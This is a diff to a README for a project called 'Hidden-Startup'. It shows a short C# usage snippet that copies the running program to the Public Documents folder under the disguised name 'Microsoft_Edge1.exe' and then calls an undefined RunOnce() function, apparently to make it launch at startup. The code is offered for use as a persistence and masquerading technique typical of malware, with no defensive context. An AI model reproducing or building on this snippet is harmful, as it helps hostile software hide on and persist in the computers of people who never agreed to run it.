@@ -1,5 +1,5 @@
 # Hidden-Startup
-Use this code after copy to path
+Usage
 ```C#
 string publicDir = Environment.GetEnvironmentVariable("public");
 string copyPath = publicDir + @"\Documents\Microsoft_Edge1.exe";
@@ -9,4 +9,5 @@ if (!(copyFile.Exists))
 {
     System.IO.File.Copy(OriginPath, copyPath);
 }
+RunOnce()
 ```
